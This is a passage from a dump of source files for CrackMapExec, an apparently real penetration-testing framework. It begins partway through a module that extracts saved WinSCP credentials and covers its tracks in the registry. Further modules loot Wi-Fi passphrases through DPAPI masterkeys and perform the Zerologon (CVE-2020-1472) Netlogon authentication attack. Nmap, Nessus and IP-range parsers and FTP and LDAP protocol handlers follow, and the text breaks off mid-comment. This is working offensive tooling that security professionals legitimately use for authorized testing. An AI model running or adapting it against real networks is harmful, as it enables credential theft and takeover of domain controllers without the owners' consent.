unloadMissingUsers(self, context, connection, unloadedUserObjects):\n        """"""\n        If some User were not logged in at the beginning we unload them from registry. Don\'t leave clues behind...\n        """"""\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            # Unload Profile\n            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, """")\n            keyHandle = ans[""phkResult""]\n\n            for userObject in unloadedUserObjects:\n                context.log.debug(""UNLOAD USER FROM REGISTRY: "" + userObject)\n                try:\n                    rrp.hBaseRegUnLoadKey(remoteOps._RemoteOperations__rrp, keyHandle, userObject)\n                except Exception as e:\n                    context.log.fail(f""Error unloading user {userObject} in registry: {e}"")\n                    context.log.debug(traceback.format_exc())\n            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n        finally:\n            remoteOps.finish()\n\n    def checkMasterpasswordSet(self, connection, userObject):\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            ans = rrp.hBaseRegOpenKey(\n                remoteOps._RemoteOperations__rrp,\n                regHandle,\n                userObject + ""\\\\Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Configuration\\\\Security"",\n            )\n            keyHandle = ans[""phkResult""]\n\n            useMasterPassword = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""UseMasterPassword"")[1]\n            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n        finally:\n            remoteOps.finish()\n        return useMasterPassword\n\n    def registryDiscover(self, context, connection):\n        context.log.display(""Looking for WinSCP creds in Registry..."")\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            # Enumerate all Users on System\n            userObjects = self.findAllLoggedInUsersInRegistry(context, connection)\n            allUserObjects = self.findAllUsers(context, connection)\n            self.userObjectToNameMapper(context, connection, allUserObjects)\n\n            # Users which must be loaded into registry:\n            unloadedUserObjects = list(set(userObjects).symmetric_difference(set(allUserObjects)))\n            self.loadMissingUsers(context, connection, unloadedUserObjects)\n\n            # Retrieve how many sessions are stored in registry from each UserObject\n            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n            for userObject in allUserObjects:\n                try:\n                    ans = rrp.hBaseRegOpenKey(\n                        remoteOps._RemoteOperations__rrp,\n                        regHandle,\n                        userObject + ""\\\\Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions"",\n                    )\n                    keyHandle = ans[""phkResult""]\n\n                    data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)\n                    sessions = data[""lpcSubKeys""]\n                    context.log.success(\'Found {} sessions for user ""{}"" in registry!\'.format(sessions - 1, self.userDict[userObject]))\n\n                    # Get Session Names\n                    sessionNames = []\n                    for i in range(sessions):\n                        sessionNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)[""lpNameOut""].split(""\\x00"")[:-1][0])\n                    rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n                    sessionNames.remove(""Default%20Settings"")\n\n                    if self.checkMasterpasswordSet(connection, userObject):\n                        context.log.fail(""MasterPassword set! Aborting extraction..."")\n                        continue\n                    # Extract stored Session infos\n                    for sessionName in sessionNames:\n                        self.printCreds(\n                            context,\n                            self.registrySessionExtractor(context, connection, userObject, sessionName),\n                        )\n                except DCERPCException as e:\n                    if str(e).find(""ERROR_FILE_NOT_FOUND""):\n                        context.log.debug(""No WinSCP config found in registry for user {}"".format(userObject))\n                except Exception as e:\n                    context.log.fail(f""Unexpected error: {e}"")\n                    context.log.debug(traceback.format_exc())\n            self.unloadMissingUsers(context, connection, unloadedUserObjects)\n        except DCERPCException as e:\n            # Error during registry query\n            if str(e).find(""rpc_s_access_denied""):\n                context.log.fail(""Error: rpc_s_access_denied. Seems like you don\'t have enough privileges to read the registry."")\n        except Exception as e:\n            context.log.fail(f""UNEXPECTED ERROR: {e}"")\n            context.log.debug(traceback.format_exc())\n        finally:\n            remoteOps.finish()\n\n    # ==================== Handle Configs ====================\n    def decodeConfigFile(self, context, confFile):\n        config = configparser.RawConfigParser(strict=False)\n        config.read_string(confFile)\n\n        # Stop extracting creds if Master Password is set\n        if int(config.get(""Configuration\\\\Security"", ""UseMasterPassword"")) == 1:\n            context.log.fail(""Master Password Set, unable to recover saved passwords!"")\n            return\n\n        for section in config.sections():\n            if config.has_option(section, ""HostName""):\n                hostName = unquote(config.get(section, ""HostName""))\n                userName = config.get(section, ""UserName"")\n                if config.has_option(section, ""Password""):\n                    encPassword = config.get(section, ""Password"")\n                    decPassword = self.decryptPasswd(hostName, userName, encPassword)\n                else:\n                    decPassword = ""NO_PASSWORD_FOUND""\n                sectionName = unquote(section)\n                self.printCreds(context, [sectionName, hostName, userName, decPassword])\n\n    def getConfigFile(self, context, connection):\n        if self.filepath:\n            self.share = self.filepath.split("":"")[0] + ""$""\n            path = self.filepath.split("":"")[1]\n\n            try:\n                buf = BytesIO()\n                connection.conn.getFile(self.share, path, buf.write)\n                confFile = buf.getvalue().decode()\n                context.log.success(""Found config file! Extracting credentials..."")\n                self.decodeConfigFile(context, confFile)\n            except:\n                context.log.fail(""Error! No config file found at {}"".format(self.filepath))\n                context.log.debug(traceback.format_exc())\n        else:\n            context.log.display(""Looking for WinSCP creds in User documents and AppData..."")\n            output = connection.execute(\'powershell.exe ""Get-LocalUser | Select name""\', True)\n            users = []\n            for row in output.split(""\\r\\n""):\n                users.append(row.strip())\n            users = users[2:]\n\n            # Iterate over found users and default paths to look for WinSCP.ini files\n            for user in users:\n                paths = [\n                    (""\\\\Users\\\\"" + user + ""\\\\Documents\\\\WinSCP.ini""),\n                    (""\\\\Users\\\\"" + user + ""\\\\AppData\\\\Roaming\\\\WinSCP.ini""),\n                ]\n                for path in paths:\n                    confFile = """"\n                    try:\n                        buf = BytesIO()\n                        connection.conn.getFile(self.share, path, buf.write)\n                        confFile = buf.getvalue().decode()\n                        context.log.success(\'Found config file at ""{}""! Extracting credentials...\'.format(self.share + path))\n                    except:\n                        context.log.debug(\'No config file found at ""{}""\'.format(self.share + path))\n                    if confFile:\n                        self.decodeConfigFile(context, confFile)\n\n    def on_admin_login(self, context, connection):\n        if not self.filepath:\n            self.registryDiscover(context, connection)\n        self.getConfigFile(context, connection)\n', 'wireless.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom dploot.triage.masterkeys import MasterkeysTriage\nfrom dploot.lib.target import Target\nfrom dploot.lib.smb import DPLootSMBConnection\nfrom dploot.triage.wifi import WifiTriage\n\nfrom cme.helpers.logger import highlight\n\n\nclass CMEModule:\n    name = ""wifi""\n    description = ""Get key of all wireless interfaces""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """""" """"""\n\n    def on_admin_login(self, context, connection):\n        host = connection.hostname + ""."" + connection.domain\n        domain = connection.domain\n        username = connection.username\n        kerberos = connection.kerberos\n        aesKey = connection.aesKey\n        use_kcache = getattr(connection, ""use_kcache"", False)\n        password = getattr(connection, ""password"", """")\n        lmhash = getattr(connection, ""lmhash"", """")\n        nthash = getattr(connection, ""nthash"", """")\n\n        target = Target.create(\n            domain=domain,\n            username=username,\n            password=password,\n            target=host,\n            lmhash=lmhash,\n            nthash=nthash,\n            do_kerberos=kerberos,\n            aesKey=aesKey,\n            no_pass=True,\n            use_kcache=use_kcache,\n        )\n\n        conn = None\n\n        try:\n            conn = DPLootSMBConnection(target)\n            conn.smb_session = connection.conn\n        except Exception as e:\n            context.log.debug(""Could not upgrade connection: {}"".format(e))\n            return\n\n        masterkeys = []\n        try:\n            masterkeys_triage = MasterkeysTriage(target=target, conn=conn)\n            masterkeys += masterkeys_triage.triage_system_masterkeys()\n        except Exception as e:\n            context.log.debug(""Could not get masterkeys: {}"".format(e))\n\n        if len(masterkeys) == 0:\n            context.log.fail(""No masterkeys looted"")\n            return\n\n        context.log.success(""Got {} decrypted masterkeys. Looting Wifi interfaces"".format(highlight(len(masterkeys))))\n\n        try:\n            # Collect Chrome Based Browser stored secrets\n            wifi_triage = WifiTriage(target=target, conn=conn, masterkeys=masterkeys)\n            wifi_creds = wifi_triage.triage_wifi()\n        except Exception as e:\n            context.log.debug(""Error while looting wifi: {}"".format(e))\n        for wifi_cred in wifi_creds:\n            if wifi_cred.auth.upper() == ""OPEN"":\n                context.log.highlight(""[OPEN] %s"" % (wifi_cred.ssid))\n            elif wifi_cred.auth.upper() in [""WPAPSK"", ""WPA2PSK"", ""WPA3SAE""]:\n                try:\n                    context.log.highlight(\n                        ""[%s] %s - Passphrase: %s""\n                        % (\n                            wifi_cred.auth.upper(),\n                            wifi_cred.ssid,\n                            wifi_cred.password.decode(""latin-1""),\n                        )\n                    )\n                except:\n                    context.log.highlight(""[%s] %s - Passphrase: %s"" % (wifi_cred.auth.upper(), wifi_cred.ssid, wifi_cred.password))\n            elif wifi_cred.auth.upper() in [\'WPA\', \'WPA2\']:\n                try:\n                    if self.eap_username is not None and self.eap_password is not None:\n                        context.log.highlight(\n                            ""[%s] %s - %s - Identifier: %s:%s""\n                            % (\n                                wifi_cred.auth.upper(),\n                                wifi_cred.ssid,\n                                wifi_cred.eap_type,\n                                wifi_cred.eap_username,\n                                wifi_cred.eap_password,\n                            )\n                        )\n                    else:\n                        context.log.highlight(\n                            ""[%s] %s - %s ""\n                            % (\n                                wifi_cred.auth.upper(),\n                                wifi_cred.ssid,\n                                wifi_cred.eap_type,\n                            )\n                        )\n                except:\n                    context.log.highlight(""[%s] %s - Passphrase: %s"" % (wifi_cred.auth.upper(), wifi_cred.ssid, wifi_cred.password))\n            else:\n                context.log.highlight(""[WPA-EAP] %s - %s"" % (wifi_cred.ssid, wifi_cred.eap_type))\n', 'zerologon.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# everything is comming from https://github.com/dirkjanm/CVE-2020-1472\n# credit to @dirkjanm\n# module by : @mpgn_x64\nfrom impacket.dcerpc.v5 import nrpc, epm, transport\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nimport sys\nfrom cme.logger import cme_logger\n\n# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.\nMAX_ATTEMPTS = 2000  # False negative chance: 0.04%\n\n\nclass CMEModule:\n    name = ""zerologon""\n    description = ""Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472""\n    supported_protocols = [""smb"", ""wmi""]\n    opsec_safe = True\n    multiple_hosts = False\n\n    def __init__(self, context=None, module_options=None):\n        self.context = context\n        self.module_options = module_options\n\n    def options(self, context, module_options):\n        """"""""""""\n\n    def on_login(self, context, connection):\n        self.context = context\n        if self.perform_attack(""\\\\\\\\"" + connection.hostname, connection.host, connection.hostname):\n            self.context.log.highlight(""VULNERABLE"")\n            self.context.log.highlight(""Next step: https://github.com/dirkjanm/CVE-2020-1472"")\n            try:\n                host = self.context.db.get_hosts(connection.host)[0]\n                self.context.db.add_host(\n                    host.ip,\n                    host.hostname,\n                    host.domain,\n                    host.os,\n                    host.smbv1,\n                    host.signing,\n                    zerologon=True,\n                )\n            except Exception as e:\n                self.context.log.debug(f""Error updating zerologon status in database"")\n\n    def perform_attack(self, dc_handle, dc_ip, target_computer):\n        # Keep authenticating until successful. Expected average number of attempts needed: 256.\n        self.context.log.debug(""Performing authentication attempts..."")\n        rpc_con = None\n        try:\n            binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol=""ncacn_ip_tcp"")\n            rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()\n            rpc_con.connect()\n            rpc_con.bind(nrpc.MSRPC_UUID_NRPC)\n            for attempt in range(0, MAX_ATTEMPTS):\n                result = try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer)\n                if result:\n                    return True\n            else:\n                self.context.log.highlight(""Attack failed. Target is probably patched."")\n        except DCERPCException as e:\n            self.context.log.fail(f""Error while connecting to host: DCERPCException, "" f""which means this is probably not a DC!"")\n\ndef fail(msg):\n    cme_logger.debug(msg)\n    cme_logger.fail(""This might have been caused by invalid arguments or network issues."")\n    sys.exit(2)\n\ndef try_zero_authenticate(rpc_con, dc_handle, dc_ip, target_computer):\n    # Connect to the DC\'s Netlogon service.\n\n    # Use an all-zero challenge and credential.\n    plaintext = b""\\x00"" * 8\n    ciphertext = b""\\x00"" * 8\n\n    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.\n    flags = 0x212FFFFF\n\n    # Send challenge and authentication request.\n    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + ""\\x00"", target_computer + ""\\x00"", plaintext)\n    try:\n        server_auth = nrpc.hNetrServerAuthenticate3(\n            rpc_con,\n            dc_handle + ""\\x00"",\n            target_computer + ""$\\x00"",\n            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,\n            target_computer + ""\\x00"",\n            ciphertext,\n            flags,\n        )\n\n        # It worked!\n        assert server_auth[""ErrorCode""] == 0\n        return True\n\n    except nrpc.DCERPCSessionError as ex:\n        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.\n        if ex.get_error_code() == 0xC0000022:\n            return None\n        else:\n            fail(f""Unexpected error code from DC: {ex.get_error_code()}."")\n    except BaseException as ex:\n        fail(f""Unexpected error: {ex}."")\n', 'ip.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom ipaddress import ip_address, ip_network, summarize_address_range, ip_interface\n\n\ndef parse_targets(target):\n    try:\n        if ""-"" in target:\n            start_ip, end_ip = target.split(""-"")\n            try:\n                end_ip = ip_address(end_ip)\n            except ValueError:\n                first_three_octets = start_ip.split(""."")[:-1]\n                first_three_octets.append(end_ip)\n                end_ip = ip_address(""."".join(first_three_octets))\n\n            for ip_range in summarize_address_range(ip_address(start_ip), end_ip):\n                for ip in ip_range:\n                    yield str(ip)\n        else:\n            if ip_interface(target).ip.version == 6 and ip_address(target).is_link_local:\n                yield str(target)\n            else:\n                for ip in ip_network(target, strict=False):\n                    yield str(ip)\n    except ValueError as e:\n        yield str(target)\n', 'nessus.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport xmltodict\n\n# Ideally i\'d like to be able to pull this info out dynamically from each protocol object but i\'m a lazy bastard\nprotocol_dict = {\n    ""smb"": {""ports"": [445, 139], ""services"": [""smb"", ""cifs""]},\n    ""mssql"": {""ports"": [1433], ""services"": [""mssql""]},\n    ""ssh"": {""ports"": [22], ""services"": [""ssh""]},\n    ""winrm"": {""ports"": [5986, 5985], ""services"": [""www"", ""https?""]},\n    ""http"": {""ports"": [80, 443, 8443, 8008, 8080, 8081], ""services"": [""www"", ""https?""]},\n}\n\n\ndef parse_nessus_file(nessus_file, protocol):\n    targets = []\n\n    def handle_nessus_file(path, item):\n        # Must return True otherwise xmltodict will throw a ParsingIterrupted() exception\n        # https://github.com/martinblech/xmltodict/blob/master/xmltodict.py#L219\n\n        if any(""ReportHost"" and ""ReportItem"" in values for values in path):\n            item = dict(path)\n            ip = item[""ReportHost""][""name""]\n            if ip in targets:\n                return True\n\n            port = item[""ReportItem""][""port""]\n            svc_name = item[""ReportItem""][""svc_name""]\n\n            if port in protocol_dict[protocol][""ports""]:\n                targets.append(ip)\n            if svc_name in protocol_dict[protocol][""services""]:\n                targets.append(ip)\n\n            return True\n        else:\n            return True\n\n    with open(nessus_file, ""r"") as file_handle:\n        xmltodict.parse(file_handle, item_depth=4, item_callback=handle_nessus_file)\n\n    return targets\n', 'nmap.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom libnmap.parser import NmapParser\nfrom cme.logger import cme_logger\n\n# right now we are only referencing the port numbers, not the service name, but this should be sufficient for 99% cases\nprotocol_dict = {\n    ""ftp"": {\n        ""ports"": [21],\n        ""services"": [""ftp""]\n    },\n    ""ssh"": {\n        ""ports"": [22, 2222],\n        ""services"": [""ssh""]\n    },\n    ""smb"": {\n        ""ports"": [139, 445],\n        ""services"": [""netbios-ssn"", ""microsoft-ds""]\n    },\n    ""ldap"": {\n        ""ports"": [389, 636],\n        ""services"": [""ldap"", ""ldaps""]\n    },\n    ""mssql"": {\n        ""ports"": [1433],\n        ""services"": [""ms-sql-s""]\n    },\n    ""rdp"": {\n        ""ports"": [3389],\n        ""services"": [""ms-wbt-server""]\n    },\n    ""winrm"": {\n        ""ports"": [5985, 5986],\n        ""services"": [""wsman""]\n    },\n    ""vnc"": {\n        ""ports"": [5900, 5901, 5902, 5903, 5904, 5905, 5906],\n        ""services"": [""vnc""]\n    },\n}\n\n\ndef parse_nmap_xml(nmap_output_file, protocol):\n    nmap_report = NmapParser.parse_fromfile(nmap_output_file)\n    targets = []\n\n    for host in nmap_report.hosts:\n        for port, proto in host.get_open_ports():\n            if port in protocol_dict[protocol][""ports""]:\n                targets.append(host.ipv4)\n                break\n    cme_logger.debug(f""Targets parsed from Nmap scan: {targets}"")\n\n    return targets\n', 'ftp.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nfrom cme.config import process_secret\nfrom cme.connection import *\nfrom cme.logger import CMEAdapter\nfrom ftplib import FTP, error_reply, error_temp, error_perm, error_proto\n\n\nclass ftp(connection):\n    def __init__(self, args, db, host):\n        self.protocol = ""FTP""\n        self.remote_version = None\n\n        super().__init__(args, db, host)\n\n    def proto_logger(self):\n        self.logger = CMEAdapter(\n            extra={\n                ""protocol"": ""FTP"",\n                ""host"": self.host,\n                ""port"": self.args.port,\n                ""hostname"": self.hostname,\n            }\n        )\n\n    def proto_flow(self):\n        self.proto_logger()\n        if self.create_conn_obj():\n            if self.enum_host_info():\n                if self.print_host_info():\n                    if self.login():\n                        pass\n\n    def enum_host_info(self):\n        welcome = self.conn.getwelcome()\n        self.logger.debug(f""Welcome result: {welcome}"")\n        self.remote_version = welcome.split(""220"", 1)[1].strip()  # strip out the extra space in the front\n        self.logger.debug(f""Remote version: {self.remote_version}"")\n        return True\n\n    def print_host_info(self):\n        self.logger.display(f""Banner: {self.remote_version}"")\n        return True\n\n    def create_conn_obj(self):\n        self.conn = FTP()\n        try:\n            self.conn.connect(host=self.host, port=self.args.port)\n        except error_reply:\n            return False\n        except error_temp:\n            return False\n        except error_perm:\n            return False\n        except error_proto:\n            return False\n        except socket.error:\n            return False\n        return True\n\n    def plaintext_login(self, username, password):\n        if not self.conn.sock:\n            self.create_conn_obj()\n        try:\n            self.logger.debug(self.conn.sock)\n            resp = self.conn.login(user=username, passwd=password)\n            self.logger.debug(f""Response: {resp}"")\n        except Exception as e:\n            self.logger.fail(f""{username}:{process_secret(password)} (Response:{e})"")\n            self.conn.close()\n            return False\n\n        # 230 is ""User logged in, proceed"" response, ftplib raises an exception on failed login\n        if ""230"" in resp:\n            self.logger.debug(f""Host: {self.host} Port: {self.args.port}"")\n            self.db.add_host(self.host, self.args.port, self.remote_version)\n\n            cred_id = self.db.add_credential(username, password)\n\n            host_id = self.db.get_hosts(self.host)[0].id\n            self.db.add_loggedin_relation(cred_id, host_id)\n\n            if username in [""anonymous"", """"] and password in ["""", ""-""]:\n                self.logger.success(f""{username}:{process_secret(password)} {highlight(\'- Anonymous Login!\')}"")\n            else:\n                self.logger.success(f""{username}:{process_secret(password)}"")\n\n        if self.args.ls:\n            files = self.list_directory_full()\n            self.logger.display(f""Directory Listing"")\n            for file in files:\n                self.logger.highlight(file)\n\n        if not self.args.continue_on_success:\n            self.conn.close()\n            return True\n        self.conn.close()\n\n\n    def list_directory_full(self):\n        # in the future we can use mlsd/nlst if we want, but this gives a full output like `ls -la`\n        # ftplib\'s ""dir"" prints directly to stdout, and ""nlst"" only returns the folder name, not full details\n        files = []\n        self.conn.retrlines(""LIST"", callback=files.append)\n        return files\n\n    def supported_commands(self):\n        raw_supported_commands = self.conn.sendcmd(""HELP"")\n        supported_commands = [item for sublist in (x.split() for x in raw_supported_commands.split(""\\n"")[1:-1]) for item in sublist]\n        self.logger.debug(f""Supported commands: {supported_commands}"")\n        return supported_commands\n', 'ldap.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py\n# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf\nimport hashlib\nimport hmac\nimport os\nimport socket\nfrom binascii import hexlify\nfrom datetime import datetime\nfrom re import sub, I\nfrom zipfile import ZipFile\nfrom termcolor import colored\n\nfrom Cryptodome.Hash import MD4\nfrom OpenSSL.SSL import SysCallError\nfrom bloodhound.ad.authentication import ADAuthentication\nfrom bloodhound.ad.domain import AD\nfrom impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_GSS_NEGOTIATE\nfrom impacket.dcerpc.v5.samr import (\n    UF_ACCOUNTDISABLE,\n    UF_DONT_REQUIRE_PREAUTH,\n    UF_TRUSTED_FOR_DELEGATION,\n    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,\n)\nfrom impacket.dcerpc.v5.transport import DCERPCTransportFactory\nfrom impacket.krb5 import constants\nfrom impacket.krb5.kerberosv5 import getKerberosTGS, SessionKeyDecryptionError\nfrom impacket.krb5.types import Principal, KerberosException\nfrom impacket.ldap import ldap as ldap_impacket\nfrom impacket.ldap import ldapasn1 as ldapasn1_impacket\nfrom impacket.smb import SMB_DIALECT\nfrom impacket.smbconnection import SMBConnection, SessionError\n\nfrom cme.config import process_secret, host_info_colors\nfrom cme.connection import *\nfrom cme.helpers.bloodhound import add_user_bh\nfrom cme.logger import CMEAdapter, cme_logger\nfrom cme.protocols.ldap.bloodhound import BloodHound\nfrom cme.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB\nfrom cme.protocols.ldap.kerberos import KerberosAttacks\n\nldap_error_status = {\n    ""1"": ""STATUS_NOT_SUPPORTED"",\n    ""533"": ""STATUS_ACCOUNT_DISABLED"",\n    ""701"": ""STATUS_ACCOUNT_EXPIRED"",\n    ""531"": ""STATUS_ACCOUNT_RESTRICTION"",\n    ""530"": ""STATUS_INVALID_LOGON_HOURS"",\n    ""532"": ""STATUS_PASSWORD_EXPIRED"",\n    ""773"": ""STATUS_PASSWORD_MUST_CHANGE"",\n    ""775"": ""USER_ACCOUNT_LOCKED"",\n    ""50"": ""LDAP_INSUFFICIENT_ACCESS"",\n    ""0"": ""LDAP Signing IS Enforced"",\n    ""KDC_ERR_CLIENT_REVOKED"": ""KDC_ERR_CLIENT_REVOKED"",\n    ""KDC_ERR_PREAUTH_FAILED"": ""KDC_ERR_PREAUTH_FAILED"",\n}\n\n\ndef resolve_collection_methods(methods):\n    """"""\n    Convert methods (string) to list of validated methods to resolve\n    """"""\n    valid_methods = [\n        ""group"",\n        ""localadmin"",\n        ""session"",\n        ""trusts"",\n        ""default"",\n        ""all"",\n        ""loggedon"",\n        ""objectprops"",\n        ""experimental"",\n        ""acl"",\n        ""dcom"",\n        ""rdp"",\n        ""psremote"",\n        ""dconly"",\n        ""container"",\n    ]\n    default_methods = [""group"", ""localadmin"", ""session"", ""trusts""]\n    # Similar to SharpHound, All is not really all, it excludes loggedon\n    all_methods = [\n        ""group"",\n        ""localadmin"",\n        ""session"",\n        ""trusts"",\n        ""objectprops"",\n        ""acl"",\n        ""dcom"",\n        ""rdp"",\n        ""psremote"",\n        ""container"",\n    ]\n    # DC only, does not collect to computers\n    dconly_methods = [""group"", ""trusts"", ""objectprops"", ""acl"", ""container""]\n    if "","" in methods:\n        method_list = [method.lower() for method in methods.split("","")]\n        validated_methods = []\n        for method in method_list:\n            if method not in valid_methods:\n                cme_logger.error(""Invalid collection method specified: %s"", method)\n                return False\n\n            if method == ""default"":\n                validated_methods += default_methods\n            elif method == ""all"":\n                validated_methods += all_methods\n            elif method == ""dconly"":\n                validated_methods += dconly_methods\n            else:\n                validated_methods.append(method)\n        return set(validated_methods)\n    else:\n        validated_methods = []\n        # It is only one\n        method = methods.lower()\n        if method in valid_methods:\n            if method == ""default"":\n                validated_methods += default_methods\n            elif method == ""all"":\n                validated_methods += all_methods\n            elif method == ""dconly"":\n                validated_methods += dconly_methods\n            else:\n                validated_methods.append(method)\n            return set(validated_methods)\n        else:\n            cme_logger.error(""Invalid collection method specified: %s"", method)\n            return False\n\nclass ldap(connection):\n    def __init__(self, args, db, host):\n        self.domain = None\n        self.server_os = None\n        self.os_arch = 0\n        self.hash = None\n        self.ldapConnection = None\n        self.lmhash = """"\n        self.nthash = """"\n        self.baseDN = """"\n        self.target = """"\n        self.targetDomain = """"\n        self.remote_ops = None\n        self.bootkey = None\n        self.output_filename = None\n        self.smbv1 = None\n        self.signing = False\n        self.admin_privs = False\n        self.no_ntlm = False\n        self.sid_domain = """"\n\n        connection.__init__(self, args, db, host)\n\n    def proto_logger(self):\n        # self.logger = cme_logger\n        self.logger = CMEAdapter(\n            extra={\n                ""protocol"": ""LDAP"",\n                ""host"": self.host,\n                ""port"": self.args.port,\n                ""hostname"": self.hostname,\n            }\n        )\n\n    def get_ldap_info(self, host):\n        try:\n            proto = ""ldaps"" if (self.args.gmsa or self.args.port == 636) else ""ldap""\n            ldap_url = f""{proto}://{host}""\n            self.logger.info(f""Connecting to {ldap_url} with no baseDN"")\n            try:\n                ldap_connection = ldap_impacket.LDAPConnection(ldap_url)\n                if ldap_connection:\n                    self.logger.debug(f""ldap_connection: {ldap_connection}"")\n            except SysCallError as e:\n                if proto == ""ldaps"":\n                    self.logger.debug(f""LDAPs connection to {ldap_url} failed - {e}"")\n                    # https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-over-ssl-3rd-certification-authority\n                    self.logger.debug(f""Even if the port is open, LDAPS may not be configured"")\n                else:\n                    self.logger.debug(f""LDAP connection to {ldap_url} failed: {e}"")\n                return [None, None, None]\n\n            resp = ldap_connection.search(\n                scope=ldapasn1_impacket.Scope(""baseObject""),\n                attributes=[""defaultNamingContext"", ""dnsHostName""],\n                sizeLimit=0,\n            )\n            for item in resp:\n                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:\n                    continue\n                target = None\n                target_domain = None\n                base_dn = None\n                try:\n                    for attribute in item[""attributes""]:\n                        if str(attribute[""type""]) == ""defaultNamingContext"":\n                            base_dn = str(attribute[""vals""][0])\n                            target_domain = sub(\n                                "",DC="",\n                                ""."",\n                                base_dn[base_dn.lower().find(""dc="") :],\n                                flags=I,\n                            )[3:]\n                        if str(attribute[""type""]) == ""dnsHostName"":\n                            target = str(attribute[""vals""][0])\n                except Exception as e:\n                    self.logger.debug(""Exception:"", exc_info=True)\n                    self.logger.info(f""Skipping item, cannot process due to error {e}"")\n        except OSError as e:\n            return [None, None, None]\n        self.logger.debug(f""Target: {target}; target_domain: {target_domain}; base_dn: {base_dn}"")\n        return [target, target_domain, base_dn]\n\n    def get_os_arch(self):\n        try:\n            string_binding = rf""ncacn_ip_tcp:{self.host}[135]""\n            transport = DCERPCTransportFactory(string_binding)\n            transport.set_connect_timeout(5)\n            dce = transport.get_dce_rpc()\n            if self.args.kerberos:\n                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n            dce.connect()\n            try:\n                dce.bind(\n                    MSRPC_UUID_PORTMAP,\n                    transfer_syntax=(""71710533-BEBA-4937-8319-B5DBEF9CCC36"", ""1.0""),\n                )\n            except DCERPCException as e:\n                if str(e).find(""syntaxes_not_supported"") >= 0:\n                    dce.disconnect()\n                    return 32\n            else:\n                dce.disconnect()\n                return 64\n        except Exception as e:\n            self.logger.fail(f""Error retrieving os arch of {self.host}: {str(e)}"")\n\n        return 0\n\n    def get_ldap_username(self):\n        extended_request = ldapasn1_impacket.ExtendedRequest()\n        extended_request[""requestName""] = ""1.3.6.1.4.1.4203.1.11.3""  # whoami\n\n        response = self.ldapConnection.sendReceive(extended_request)\n        for message in response:\n            search_result = message[""protocolOp""].getComponent()\n            if search_result[""resultCode""] == ldapasn1_impacket.ResultCode(""success""):\n                response_value = search_result[""responseValue""]\n                if response_value.hasValue():\n                    value = response_value.asOctets().decode(response_value.encoding)[2:]\n                    return value.split(""\\\\"")[1]\n        return """"\n\n    def enum_host_info(self):\n        self.target, self.targetDomain, self.baseDN = self.get_ldap_info(self.host)\n        self.hostname = self.target\n        self.domain = self.targetDomain\n        # smb no open, specify the domain\n        if self.args.no_smb:\n            self.domain = self.args.domain\n        else:\n            self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]\n\n            try:\n                self.conn.login("""", """")\n            except BrokenPipeError as e:\n                self.logger.fail(f""Broken Pipe Error while attempting to login: {e}"")\n            except Exception as e:\n                if ""STATUS_NOT_SUPPORTED"" in str(e):\n                    self.no_ntlm = True\n                pass\n            if not self.no_ntlm:\n                self.domain = self.conn.getServerDNSDomainName()\n                self.hostname = self.conn.getServerName()\n            self.server_os = self.conn.getServerOS()\n            self.signing = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection[""RequireSigning""]\n            self.os_arch = self.get_os_arch()\n            self.logger.extra[""hostname""] = self.hostname\n\n            if not self.domain:\n                self.domain = self.hostname\n\n            try:\n                # DC\'s seem to want us to logoff first, windows workstations sometimes reset the connection\n                self.conn.logoff()\n            except:\n                pass\n\n            if self.args.domain:\n                self.domain = self.args.domain\n            if self.args.local_auth:\n                self.domain = self.hostname\n\n            # Re-connect since we logged 